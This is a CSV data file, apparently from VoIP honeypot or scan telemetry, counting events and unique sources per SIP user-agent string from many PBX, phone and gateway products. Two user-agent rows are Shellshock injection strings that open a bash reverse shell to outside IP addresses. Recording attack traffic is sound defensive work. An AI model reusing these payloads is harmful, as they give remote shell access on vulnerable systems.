sip_user_agent,events,unique_src
FPBX-17.0.21.7(22.5.2),9,3
Yeastar S20-30.15.0.201,9,3
Yeastar S20-30.15.0.206,9,4
Yeastar S20-30.14.0.78,9,3
NEC-i SV8100-GE A9.01/2.1,9,3
RV/V9.1.0.37 XT5000,9,3
RV/V9.1.5.56 XT4300,9,4
Asterisk PBX 21.12.1,9,2
RUVKS 2.0.0,9,3
Cisco/SRP521-1.01.19(004),9,3
Cisco/SRP521-1.2.4(003),9,2
Nefteprom-Service,9,2
NetComm NF20MESH.NC.UR-R6B032.EN,9,4
NTE-RG-1402GC build 5.4.0 SN:TG0B002224 sofia-sip/1.12.10,9,1
NTE-RG-1402GC build 6.3.1 SN:TG0B002419 sofia-sip/1.12.10,9,3
PolycomVVX-VVX_411-UA/6.4.3.5156_64167fd3f5fc,9,3
NzilaCash-Asterisk,9,3
NetPosa,9,5
Cisco/WRP500-1.0.1(002),9,4
ClassPhone,9,4
Prochista-SIP-Center,9,4
Press1-Bot,9,3
PolycomVVX-VVX_450-UA/6.4.7.4477,9,2
PolycomVVX-VVX_450-UA/6.4.4.3219,9,2
PolycomVVX-VVX_411-UA/6.4.3.5018,9,2
AGFEO SIP V3.00.15 b,9,3
Grandstream UCM6202V1.8A 1.0.20.49,9,2
Yeastar S300-30.15.0.179,9,3
Yeastar S20-65.16.0.201,9,3
Yeastar S20-65.16.0.41,9,3
AGFEO SIP V3.00.15 n (MAC=0009407F0E2E),9,2
AGFEO SIP V4.1a (DATE=03.11.23 19:09  MAC=0009406E0B43),9,3
Grandstream UCM6208V1.3A 1.0.20.52,9,3
Grandstream UCM6204V1.5A 1.0.20.30,9,2
Grandstream UCM6204V1.5A 1.0.20.31,9,4
Yealink SIP-T33G 124.86.0.75,9,3
Yealink SIP-T21P_E2 hw52.0.0.0.0.0.0 fw52.84.9.6 80:5e:c0:4f:bf:f7,9,3
FPBX-17.0.19.28(20.10.0),9,3
FPBX-17.0.19.32(18.10.0),9,2
Asterisk PBX 18.21.0,9,3
SIP UAS V3.0.0.1410735,9,3
NEC SV9100-GE 12.00.51,9,2
NEC SV9100-GE 13.20.50,9,3
NEC SV9100-GE 12.00.50,9,3
Codian MCU 4505 v4.1 (1.51),9,3
ClearlyIP-15.0.38(18.20.2),9,3
NEC-DPE-001-A-XX(NECSIPEXT2MLUA_v1),9,2
RIX67GW2/exp-4-0-3-x (Apr 12 2007),9,3
RG-1404GF/1.11.0 SN/VI2E000147 sofia-sip/1.12.10,9,3
RG-2402G-W/1.15.2.58 SN/VI30000243,9,2
Grandstream UCM6300AV1.0A 1.0.25.9,9,4
AGFEO int SIP V4.1b (DATE=07.12.23 21:20  MAC=000940780236),9,1
Yeastar S100-30.14.0.97,9,3
FPBX-16.0.45(20.16.0),9,3
FPBX-16.0.45(20.20.0),9,3
FPBX-16.0.45(16.25.3),9,1
Grandstream UCM6300AV1.1A 1.0.25.10,9,4
FPBX-16.0.45(20.15.2),9,2
Grandstream UCM6302V1.2C 1.0.13.9,9,3
FPBX-16.0.41.5(18.26.4),9,2
FPBX-16.0.41.1(16.28.0),9,4
FPBX-16.0.41.5(16.27.0),9,2
FPBX-16.0.40.7(20.7.0),9,3
Grandstream UCM6302AV1.1A 1.0.23.17,9,4
XiVO PBX 2020.18.15,9,4
XTOTAM UAC/3.0 XT-304 V4.520.0.0 SN:BG02FF7PAJCA834,9,3
Grandstream UCM6302V1.2C 1.0.2.25,9,2
Grandstream UCM6302V1.2C 1.0.23.17,9,2
Grandstream UCM6302AV1.1A 1.0.33.32,9,3
AGFEO int SIP V4.2a (DATE=28.05.25 02:41  MAC=000940701266),9,2
Yealink SIP-T19P_E2 53.83.0.30,9,3
XiVO PBX 2018.05.14,9,3
WVP-Pro v2.6.9.20260202,9,3
AGFEO int SIP V5.1h (DATE=01.10.25 00:04  MAC=0009408A0BD7),9,2
Asterisk PBX 17.6.0,9,3
DAG1000-2S DAG 2.19.10.06,9,2
CoreServer,9,3
MobilonVSS2,9,3
Ring-U 24.07 PJSIP,9,3
DAG1000-2S IAD 16.19.10.17,9,2
SIP UAS V3.0.0.1361696,9,2
SIP UAS V3.0.0.1032788,9,3
SIP Scanner Pro,9,2
SIP UAS V.2016.xxxx,9,2
SIP GATEWAY V2.0,9,2
SIP Line,9,3
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009407E008B),9,2
WVP-Pro v2.7.0.20240220,9,3
WVP-Pro v2.7.4.20250923,9,3
Grandstream UCM6302V1.3A 1.0.29.21,9,4
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009407E0B95),9,3
FPBX-16.0.40.13(18.14.0),9,2
FPBX-16.0.40.13(18.26.4),9,3
FPBX-16.0.26(18.13.0),9,2
FPBX-16.0.33(16.30.0),9,2
FPBX-16.0.39(18.16.0),9,4
Grandstream UCM6304V1.4A 1.0.17.11,9,2
Grandstream UCM6304AV1.1A 1.0.17.11,9,2
Grandstream UCM6304AV1.1A 1.0.29.19,9,3
Asterisk PBX 16.26.1,9,2
Asterisk PBX 16.17.0,9,4
Mitel Border GW/4.11.0.191-03,9,3
Mitel Border GW/4.10.0.174-01,9,3
Mitel Border GW/4.10.0.178-01,9,3
Mitel Border GW/4.11.0.163-01,9,4
Mirasystem,9,3
Mitel 6940/6.4.0.3023,9,4
Dahua UAC/3.0 VTH2421F_R V4.500.0.0,9,3
Dahua UAC/3.0 VTHARC3800H-FW2-868 V2.0.0.1 SN:AD03CF4PAJ00027,9,2
Dahua SIP UAS V1.0,9,4
DH SIP UAS V1.0,9,4
Asterisk PBX 18.10.1,9,2
Asterisk PBX 16.9.0,9,2
Asterisk PBX 16.5.1,9,2
Grandstream UCM6308V1.6A 1.0.31.7,9,3
Grandstream UCM6510V1.4B 1.0.19.21,9,3
Grandstream UCM6308V1.4A 1.0.25.9,9,4
Grandstream UCM6308AV1.0A 1.0.27.23,9,2
Grandstream UCM6304V1.6A 1.0.27.15,9,3
Grandstream UCM6304V1.4A 1.0.23.17,9,2
HKVS/2.0.0,9,2
FPBX-15.0.38(18.9),9,2
FPBX-15.0.38(16.8),9,2
FPBX-15.0.38(16.17.0),9,4
FPBX-15.0.38(16.20.0),9,3
Grandstream WP820 1.0.7.85,9,3
AS690A IP BASE/88.1.18.0;589EC6743597,9,3
AGFEO int SIP V5.2g (DATE=03.06.26 21:40  MAC=0009408209A0),9,4
AITRUNK/1.0,9,3
AGFEO int SIP V5.2g (DATE=03.06.26 19:12  MAC=0009406E1990),9,1
VoIP IP Phone 2.4.8.3 00a859f28e3f,9,4
UTECHPBX-1.0,9,3
Vodafone-H-500-s/v3.4.27,9,4
VoIPPlatform-Asterisk,9,4
VoIP_Terminal,9,2
Slican NCP 1.21.0320,9,3
Asterisk PBX 13.8.0,9,2
Asterisk PBX 13.34.0,9,3
Asterisk PBX 13.38.1,9,4
Matrix VoIPServer ME_PE_GE_16 V2R6,9,2
Matrix VoIPServer ME_PE_GE_8 V2R8,9,2
Matrix VoIPServer NE_08 V1R13,9,2
MT-Gateway/1.1.9,9,3
MTA8328-4-1.0.6.1,9,3
MOSA4604 IP PBX,9,2
Dahua UAS/3.0 VTO2211G-P-S2,9,2
Meeting Server Unigw 46.2.0.23,9,3
Mediant 800/v.6.60A.228.011,9,3
Asterisk PBX 16.12.0,9,3
Asterisk PBX 16.16.0,9,2
Sagem / MD_FAST3664 HW_V2  SN_LK09115DP330918 / FW_V6LR10J-6LA07C SW_V1.2.261.71,9,3
VOIP_TERM_2.11.0 d,9,3
V360AJR9,9,2
HiPath 3000 V8 M5T SIP Stack/4.0.26.26,9,2
VPBX109,9,3
AVM FRITZ!Box 7272 120.05.55 (Jul  2 2013),9,4
AS690A IP BASE/88.1.18.0;589EC67E3FBB,9,3
FPBX-15.0.37.9(16.16.0),9,2
IP-PBX,9,3
IP BASE/88.1.18.0;589EC682B135,9,3
FPBX-15.0.38(16.11.1),9,3
FPBX-15.0.37.9(16.22.0),9,2
FPBX-15.0.37.9(17.9.3),9,3
Asterisk PBX 13.18.3~dfsg-1ubuntu4,9,3
Starkov group,9,4
Stonehenge IP255FA 1.30.391,9,4
MCUSYSTEM/MCUsystem/5.5.82,9,3
Deltapath frSIP UC 5.3.3,9,3
Dahua UAS/3.0 VTO3211D-P-S2,9,3
Dahua UAS/3.0 VTO3221E,9,2
MATRIX SARVAM UCS SME V1R7.6.0,9,2
Sippy Softswitch v5.2-PRODUCTION.260,9,3
MP-524/v.7.28A.356.187,9,2
MOIMSTONE IP335S 1.3.8,9,3
MOIMSTONE IP460S 1.30.516,9,3
TrueConf Server 5.5.5.1004,9,3
Unknown,9,2
AVM FRITZ!Box Fon WLAN 7113 (UI) 60.04.68 (Jul 28 2009),9,4
FPBX-15.0.17.64(16.15.1),9,4
FPBX-15.0.21(16.20.0),9,3
IPDECT-V2/80.08.0001 (MAC=482567381ADF; SER= 00000; HW=4),9,2
IPDECT-V2/80.07.0004 (MAC=482567CDDE35; SER= 00000; HW=8),9,3
IPCortex 6.5.19 Asterisk_11.25.3-21,9,3
United Tech Group PBX-16.0.45(18.13.0),9,2
FPBX-15.0.37.4(16.15.1),9,2
FPBX-15.0.29(13.38.3),9,4
FPBX-15.0.23(16.24.1),9,2
FPBX-15.0.23.17(16.27.0),9,3
FPBX-14.0.17(13.38.3),9,3
FPBX-14.0.17(13.32.0),9,3
IPDECT-V2/80.08.0001 (MAC=482567DAB9C3; SER= 00000; HW=4),9,1
FPBX-14.0.5.25(13.38.3),9,3
FPBX-15.0.16(16.5.0),9,2
IPPhone ST2020 29.224.1.261 0C11052EABB3;akdoor,9,3
Tilgin Vood HG25xx_ESx000-03_02_00_32,9,3
Tilgin Vood HG233x_ESx000-02_04_01_25,9,3
Tilgin Vood 322_ESA1100_03_05_05_03,9,4
Asterisk PBX 10.12.2,9,3
Asterisk PBX 1.8.13.1~dfsg1-3+deb7u7,9,4
TANDBERG/4137 (X12.5.6),9,2
TA100 44.19.0.30,9,3
Asterisk PBX 11.25.1,9,4
Asterisk PBX 10.2.1,9,3
Asterisk PBX 11.13.1~dfsg-2+deb8u6,9,2
Asterisk PBX 1.8.7.1,9,3
EZUC PBX,9,5
Digium Gateway G100,9,3
Deltapath frSIP UC 5.4.1,9,3
DeskGreet/1.0,9,3
M500Li/v.7.26A.356.075,9,3
Estech ePhone4x v2 2.4.12.24.12,9,2
Sphairon-SL5501-4.38.2.4,9,2
Speedport ITA/Version -01012701.00.014,9,4
MAR.2.10.0N_0:0:0 Dataremote CDS-9090 SV1.0.0,9,3
MATRIX PRASAR UCS 3.3.0,9,4
IPPhone ST2020 29.224.1.261 0C11052EAAFD;akdoor,9,3
AVM FRITZ!Box Fon WLAN 7390 84.05.05 (Jul 14 2011),9,3
AVM FRITZ!Box Fon WLAN 7270 v3 74.05.54 (Feb  7 2014),9,2
Tilgin Vood HG35x_DSx000-02_09_00_26,9,3
Tilgin Vood HG35x_DSx500-02_09_00_83,9,2
Tilgin Vood HG911x,9,3
FPBX-14.0.13.12(18.26.1),9,3
FPBX-14.0.13.28(14.7.5),9,2
Integra Gatway,9,2
Innova,9,3
FPBX-14.0.16.11(13.18.3),9,2
FPBX-14.0.16.11(13.27.1),9,3
FPBX-14.0.16.11(13.38.3),9,4
AVM VoIP Gateway 5188 36.04.81 (Feb 18 2014),9,2
Technicolor / VANT-6 / AGTOT_1.0.1 / AGTOT_1.0.1,9,3
TS-v4.5.1-20g,9,3
TS-v4.7.2-08h,9,3
TPK6850W/47 20251003-0856,9,2
TAU-2M.IP/2.0.0.229 SN/VI39048699,9,3
TAU-2M.IP/1.14.1.527 SN/VI39051610 sofia-sip/1.12.10,9,2
TANDBERG/4145 (X15.5),9,2
Linksys/PAP2T-5.1.6(LS),9,2
TAU-2M.IP/2.3.0.246 SN/VI39061520,9,3
Asterisk PBX 1.8.11-cert10,9,3
AstPbx.ru,9,3
Embedded Net DVR/NVR/DVS,9,3
Linksys/SPA2102-5.1.9,9,3
TA200 44.19.0.40,9,4
TA400 41.19.0.36-1,9,2
Swyx IpPbxSrv/14.26 (Swyx.Core_14.26_20260327.1),9,3
ExVoipPBX,9,3
F620/V3.30.20P6T2S,9,3
Technicolor TG784n v3 Build 10.5.2.Q.--,9,3
Technicolor TG784n v3 Build 10.2.1.N,9,3
Aastra 6867i/6.5.0.212o,9,6
AVer,9,2
FPBX-12.0.76.6(11.18.0),9,3
FPBX-13.0.197(13.14.0),9,4
FPBX-12.0.73(11.18.0),9,3
FPBX-12.0.76.2(11.19.0),9,3
FPBX-13.0.197.31(11.25.1),9,3
FPBX-13.0.197.31(11.25.3),9,4
FPBX-13.0.197.31(13.19.1),9,2
FPBX-13.0.197.22(13.13.1),9,2
FPBX-13.0.197.22(13.29.2),9,2
FPBX-13.0.197.22(13.5.0),9,2
TAU-8.IP/1.8.1 SN/VI33017378 sofia-sip/1.12.10,9,2
TAU-8.IP/2.0.0 SN/VI33012941 sofia-sip/1.12.10,9,3
TAU-2M.IP/2.3.1.11 SN/VI39092758,9,3
TAU-2M.IP/2.3.1.11 SN/VI39076639,9,3
TAU-2M.IP/2.3.0.246 SN/VI39075619,9,2
TAU-2M.IP/2.3.1.11 SN/VI39004551,9,2
AncMobile v2.10.18.7,9,4
Adescom CTM5000,9,3
Aethra Telecommunications PBX,9,3
TB010007,9,2
F660/V2.21.20P2T2S,9,2
KalliopePBX/4.7.9,9,3
Kalliope PBX/3.12.1,9,3
KalliopePBX/4.16.0,9,2
F660/V5.2.10P2T5,9,5
F668/V1.1.0P2T2S,9,3
F620/V5.0.2P1T5,9,3
TAU-1 v1.2 with sofia-sip/1.12.10,9,3
TANDBERG/4145 (X14.3.1),9,3
TANDBERG/4144 (X12.6),9,3
Linksys/PAP2T-5.1.3(LS),9,2
LG-Ericsson IP8815E v1.1.01scm_1 SN/B061C708ADC9,9,2
LeucoPBX-14.0.2.5(14.7.5),9,3
Fanvil X303 2.12.4.5 0c383e5c7bc0,9,3
Fusion PRO/86.1.18.1;589EC6609747,9,2
FreeSWITCH-mod_sofia/1.8.7+git~20190702T200609Z~6047ebddfc~64bit,9,4
FreeSWITCH-mod_sofia/20.20.3-release+git~20250203T183706Z~4dfda5562d~32bit,9,2
pbx5eam,9,3
Fanvil X3SGLite 2.4.11.10 0c383e4b56de,9,3
201 12-392-418-1.4.2.252-SP5250SP,9,3
201 12-3896-12597-1.4.2.239-SP5250SO,9,5
201 12-3899-231-1.4.2.252-SP5250SO,9,2
201 12-3893-6085-1.3.3.206-SP5220SO,9,3
sig11 asterisk,9,3
kamailio (5.7.6 (x86_64/linux)),9,2
OpenSIPS (3.2.8 (x86_64/linux)),9,2
OpenSIPS (3.0.3 (x86_64/linux)),9,2
CALIX GS4227/26.1.0.0.30,9,2
CALIX GS4220E/25.3.0.0.56,9,3
C610A IP/42.250.00.000.000,9,1
youeranGBT28181,9,3
voiceapps-sbc,9,2
snomM100KLE/1.0.5.2-0,9,3
smg_pa_sip 3.20.5.15,9,2
FreeSWITCH-mod_sofia/1.10.11-release+git~20231222T180831Z~f24064f7c9~64bit,9,3
FreeSWITCH SaaS PABX,9,3
Flexisip/2.1.5 (sofia-sip-nta/2.0),9,3
() { :;}; bash -i >& /dev/tcp/153.75.94.83/5060 0>&1,8,5
snomM700/03.55.0022 (MAC=000413613D6F; SER= 00000; HW=255),8,3
Flexisip/2.5.1-3-gb1079f70 (sofia-sip-nta/2.0),8,2
Flora AI UC,8,2
youhua;PT924;V4.1.00;V10.00.924L001;E8C-E141,8,2
youhua;HG521E;V1.1.10;V1.00.52111T02;E8C-E141,8,1
051 12-3893-6083-1.3.3.188-SP5220SO,8,2
051 12-3893-6083-1.3.3.188-SP5220SP,8,2
051 12-35-9923929,8,3
051 12-38-28928814-0.9.5.1.1238-PSTN404,8,3
051 12-38-39929162-0.9.5.1.2005-PSTN404,8,3
051 12-38-39989162-0.9.5.1.1741-PSTN202,8,2
() { :;}; bash -i >& /dev/tcp/192.210.144.130/4444 0>&1,8,3
OpenSIPS (3.5.4 (x86_64/linux)),8,2
C530 IP/42.192.00.000.000,8,2
C530 IP/42.199.00.000.000,8,3
OpenStage_15_V3 R4.7.0       SIP  160207,8,4
OpenSIPS (3.6.3 (x86_64/linux)),8,4
OpenSIPS (4.0.0-dev (x86_64/linux)),8,4
OpenSIPS (3.4.2 (x86_64/linux)),8,3
OXO103/064.001 GW_103/045.001,8,3
OXO_GW_800/074.001,8,5
FPBX-2.8.1(1.8.11.0),8,3
FPBX-2.8.1(1.8.20.0),8,2
Grandstream GXP1610 1.0.4.138,8,3
Grandstream DP752 1.0.21.19,8,3
Grandstream DP752 1.0.21.31,8,3
PBXact-14.0.17(13.29.2),8,2
C610 IP/42.081.01.000.000,8,2
C610 IP/42.072.00.000.000,8,2
A540 IP/42.248.00.000.000,8,4
iSBC V30R002C00 (Core: 3.4.10 x86_64/linux),8,3
hikariga,8,4
Fanvil V50P 2.12.20.17 0c383e822b55,8,3
Fanvil V50P 2.12.20.4 0c383e7a1c85,8,3
FPBX-AsteriskNOW-13.0.195.17(13.2.0),8,5
FPBX-AsteriskNOW-12.0.76.2(11.16.0),8,3
FPBX-AsteriskNOW-12.0.76.4(11.16.0),8,3
Centrex,8,2
Auerswald COMpact 5200R/8.6C000,8,2
Auerswald COMpact VoIP sofia-sip/1.12.11,8,2
Auerswald PBX sofia-sip/1.12.11,8,3
Auerswald COMpact 5200/8.4G000,8,2
dlink 12-3868-5433-1.2.3.99-ON201LW,8,4
cmtel.net,8,3
A690A IP BASE/88.1.18.0;589EC6875FC0,8,3
Estech ePhone3 v2 2.4.12.18.5,8,2
Ericsson-LG Enterprise iPECS-eMG eMG80 2.1.46,8,3
Eltex smg_pa_sip smg_pa_sip-3.9.1.50,8,2
Linksys/SPA921-5.1.8,8,2
Linksys/SPA8000-6.1.12(XU),8,3
Linksys/SPA2102-5.2.13(004)_BestGo,8,2
Linksys/SPA2100-3.3.9,8,3
Liliat Edge,8,2
Telephone 1.6,8,2
TegsoftPBX,8,3
TelecomSoftPBX,8,2
Aastra 6869i/6.4.0.5013,8,4
AW306 FS1.1.000.463 (Thu,8,3
T-M-Net-PBX,8,3
Swyx IpPbxSrv/14.21 (Swyx.Core_14.21-CHF1_20250717.1),8,2
Estech ePhone4x v2 2.4.12.24.4,8,3
TC PBX,8,2
TAU-8.IP/2.4.1 SN/VI33041123,8,3
TAU-2M.IP/2.4.2.24 SN/VI39064379 sofia-sip/1.21,8,3
KX-VC1600_HDVC-MPCS 6.10 (Profile=5),8,2
FPBX-13.0.197.22(13.8.2),8,3
Issabel-4.1,8,3
Iva Media 3.150,8,2
Inteno_EG4024H225002037_44d437a4bb20,8,2
F660/V2.30.20P4T3S,8,3
KarelIPS_AAK_042,8,3
KalliopePBX/4.16.3,8,2
TELESIS Xymphony PXr5 160114,8,2
TERA Switch,8,4
Algo-8301/5.5,8,2
Akuvox R28 28.30.10.111 0C11051B00C1;akdoor,8,4
Alaudae,8,3
M5T SIP Stack/4.1.2.2,8,3
E-TAS-3AGW-01,8,2
Dinstar,8,3
Asterisk PBX 11.19.0,8,3
Asterisk PBX 11.22.0,8,3
Asterisk PBX 1.8.32.2,8,3
Asterisk PBX 1.8.5.0,8,2
TAM-PBX-01,8,3
FPBX-13.0.197.31(13.32.0),8,3
Intelbras UAC/3.0 VTOASI6213S V3.2.0.0 SN:OQZ0004914768,8,3
Inteno_E3AC24H167089733_0022075d7f84,8,2
ITC EndPoint (sofia-sip-1.12.11),8,3
IPXCX-02,8,2
Sphairon-SL5501-4.38.2.1.9,8,2
Sphairon-SL5501-4.38.2.06.03,8,3
Speedport W 722V 80.04.79 (Feb 19 2014),8,4
AVM Multibox 7390 NGN 84.05.08 (Jan 10 2012),8,1
TW;GPON;V1.0;V1.0;E8C 2+1 AP,8,3
TELESIS Xymphony PXn6 140605,8,2
FPBX-14.0.16.2(13.32.0),8,3
FPBX-14.0.16.4(13.21.1),8,2
FPBX-14.0.16.4(14.7.5),8,3
FPBX-14.0.16.9(13.38.2),8,3
FPBX-14.0.16.11(14.7.7),8,4
Asterisk 20.6.0,8,3
Asterisk Gemeinschaft,8,2
Arauto-PBX/1.0,8,3
Aristel_D2IPX,8,3
Aristel_D3IPX,8,3
TAU-2M.IP/2.1.0.38 SN/VI39064527,8,3
TAU-1M.IP/2.3.1.11 SN/VI3A028880,8,2
Aastra 6867i/4.1.0.2038,8,3
FPBX-14.0.17(13.38.1),8,3
FPBX-14.0.17(13.38.2),8,3
FPBX-15.0.37(16.6.2),8,4
FPBX-15.0.37(16.17.0),8,3
FPBX-15.0.37(16.30.0),8,2
FPBX-15.0.24(16.30.0),8,3
FPBX-15.0.24(16.6.2),8,3
FPBX-15.0.17.9(16.11.1),8,2
IPDECT-V2/80.08.0001 (MAC=4825677553FC; SER= 00000; HW=4),8,3
IPDECT-V2/80.08.0001 (MAC=482567756ED1; SER= 00000; HW=4),8,2
FPBX-15.0.16.81(16.13.0),8,3
FPBX-14.0.5.25(13.24.1),8,4
FPBX-15.0.16.53(16.30.0),8,4
FPBX-14.0.17(18.26.1),8,2
FPBX-14.0.17-1(16.7.10),8,4
FPBX-14.0.3.6(13.19.1),8,2
Tilgin Vood 342_AS0000-03_05_11_06,8,2
Tilgin Vood 322_AS0000-03_05_11_06,8,3
Thomson TG787v Build 8.2.2.1,8,2
Thomson TG789vn Build 10.A.3.2.NC,8,2
IPPhone ST2020 29.224.1.261 0C11052EABC6;akdoor,8,3
IPPBX-30.15.0.115,8,4
IPPhone MT-234P 52.164.5.138 0c11050363ba,8,2
IPDECT-V2/80.08.0001 (MAC=482567DABD20; SER= 00000; HW=4),8,2
TANDBERG/4102 (X7.0.2),8,2
TA400 41.19.86.38,8,3
TA410,8,3
Tilgin Vood HG25xx_ESx271-03_00_01_09,8,2
Tilgin Vood HG23xx_DSx000-02_03_03_19,8,1
Tilgin Vood HG238x_ESx415-03_02_01_24,8,3
Tilgin Vood HG228x_ESx000-02_10_00_93,8,2
Tilgin Vood HG233x_ESx000-02_07_03_48,8,3
Stonehenge IP215S 1.30.240,8,3
Stonehenge IP255-F 1.30.238,8,2
Stonehenge IP255FA 1.30.907,8,4
Asterisk PBX 13.18.4,8,3
Asterisk PBX 13.20.0,8,3
Asterisk PBX 13.14.0,8,2
Asterisk PBX 11.6.0,8,3
Asterisk PBX 11.9.0,8,4
Sippy Softswitch v5.1-PRODUCTION.215,8,3
Deltapath frSIP UC 5.3.1,8,2
Dahua UAS/3.0 VTO3221D,8,4
MATRIX SARVAM UCS SOHO V1R7.8.0,8,3
MATRIX SARVAM UCS SOHO V1R6.7.0,8,2
MATRIX SARVAM UCS ENT V1R6.7.0,8,3
MATRIX SARVAM UCS SMB V1R7.2.0,8,2
MATRIX SARVAM UCS SMB V1R7.6.0,8,3
UC120P-2O1G,8,2
UC200 Pro/2.46.3.0 2026-02-10 104818 CST,8,3
UC-Series-4.4.7(16.12.0),8,3
TrueConf Server 5.5.1.1044,8,2
TrueConf Server 5.5.1.1065,8,2
Sippy Softswitch v5.1-PRODUCTION.225,8,2
Sippy Softswitch v5.2-PRODUCTION.261,8,3
Sippy Softswitch v2023-PRODUCTION.453,8,2
AVM FRITZ!Box Fon WLAN 7240 Multi 73.04.81 (Feb 19 2010),8,2
AVM FRITZ!Box Fon WLAN 7270 54.04.76 (Jun 23 2009),8,2
AVM FRITZ!Box Fon WLAN 7170 Annex A 58.04.85 (Feb  9 2014),8,2
AVM FRITZ!Box Fon WLAN 7240 (UI) 73.05.54 (Feb  7 2014),8,2
AVM FRITZ!Box Fon WLAN 7170 29.04.76 (Jul 13 2009),8,2
AVM FRITZ!Box Fon 5140 (UI) 43.04.67 (Feb 10 2009),8,3
AVM FRITZ!Box Fon WLAN 7113 (fs) 60.04.58 (Jul 10 2008),8,3
UC100/2.53.4.16 2019-01-17 20:11:39 CST +0800,8,3
Sagem / HW_VFast3304-V2 / FW_V58C040-58C040 / SW_V1.2.344,8,2
Samsung OfficeServ,8,3
SRItc/1.0.1,8,4
Dahua UAS/3.0 VTO2101E,8,4
Mediant 1000 - MSBR/v.7.40A.604.077,8,3
Mediant 1000/v.6.60A.369.003,8,2
MediaAccess TG389 Build 10.5.2.T.AQ,8,3
Matrix VoIPServer ME_PE_GE_16 V2R8,8,1
VOIP_TERM_J_2.12.28 cb,8,2
VOCAL 7.83,8,4
VOIP LikiUA,8,2
V10.00.924R003,8,3
V1.0.921R003,8,2
SilkSIP1,8,3
SchoolWR-Dialer,8,3
Siedle SG,8,2
IP BASE/88.1.18.0;589EC6712737,8,3
ICOTERA i6850 (6850-1.17.7),8,2
ICOTERA i6850 (6850-1.19.3),8,4
ININ-EDGE/1.0.0.32690,8,3
Hanyang_G201C_3.1.6CJ,8,4
Hanyang_HYC-G201C_3.1.8CJ,8,3
AVM FRITZ!Box 7330 107.05.20 (Mar 14 2012),8,2
VOS3000 V2.1.2.6,8,3
StandardServer,8,2
TrueConf Server 4.7.3.1122,8,2
TrueConf Server 5.3.9.1007,8,3
FPBX-15.0.38(13.38.3),8,3
FPBX-15.0.38(16.15.0),8,4
FPBX-15.0.37.8(16.30.0),8,2
FPBX-15.0.37.8(16.20.0),8,4
IPBX-2.11.0(13.22.0),8,4
DLINK DPH-150S FRU2.2.1328.545,8,2
Mitel Border GW/4.4.0.81-01,8,3
Mitel Border GW(MBG/11.6.0.128 TUG/4.18.0.76-02CCS8047),8,3
Sippy Softswitch v2023-PRODUCTION.441,8,3
Sippy Softswitch v2023-PRODUCTION.449,8,3
Asterisk PBX 16.28.0~dfsg-0+deb11u4,8,2
Asterisk PBX 16.28.0~dfsg-0+deb11u7,8,2
Asterisk PBX 16.2.1,8,2
Asterisk PBX 16.30.0,8,3
Asterisk PBX 16.30.1-vici,8,2
SPA-202,8,3
SIP-6328-4-v4.2.80-__/v2.0 Enabled,8,4
SIP-VOIP-SERVER/1.0,8,3
SIP phone,8,2
Mitel Border GW/4.9.3.10-01,8,3
DZPhone-Asterisk,8,4
VoIp PBX Sovetsky,8,2
AGFEO int SIP V5.2g (DATE=03.06.26 20:34  MAC=0009408A0B22),8,3
HTS,8,4
HUAWEI CloudMCU,8,2
FPBX-16.0.21.9(18.13.0),8,3
FPBX-15.0.38(17.9.4),8,3
Grandstream UCM6510V1.4B 1.0.20.52,8,3
Grandstream UCM6308AV1.1A 1.0.25.9,8,3
Matrix-SETUVGFXNG,8,2
MP-112 FXS/v.6.60A.332.002,8,2
Smile CTI Server UDPn,8,4
Slican NCP 1.24.0360,8,4
Slican NCP 1.25.0069 alpha,8,2
V10.00.924FJ02,8,3
Unibell SBC 195,8,4
Vox-Line-PBX,8,2
DG834GV-0024B2F108A7-V2.02.42_U,8,3
DAG1000-2S DAG 2.19.10.15,8,2
CustomPBX,8,2
D-Link DVG-1402S,8,2
D-Link SIP Gateway,8,3
ConnexCS Cloud Switch,8,3
MyAsterisk,8,3
N300 IP/42.243.00.000.000,8,4
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009405C1AB3),8,4
AGFEO int SIP V5.1h (DATE=30.09.25 22:41  MAC=0009406E05AD),8,2
WVP-Pro v2.7.0.20240122,8,2
WVP-Pro v2.7.4.20250827,8,3
SIP UAS V2.1.4.488713,8,3
SIDIAL-server,8,2
NBX2000,8,4
NEC SL Series 06.00/2.1,8,2
FPBX-16.0.33(18.16.0),8,2
Grandstream UCM6302V1.3A 1.0.29.19,8,2
Grandstream UCM6302V1.2C 1.0.33.30,8,5
Grandstream UCM6302V1.3A 1.0.15.13,8,3
WVP-Pro v2.7.4.2026-03-17T17:20:38+08:00,8,3
WVP-Pro v2.7.4.2026-05-15T10:10:53Z,8,2
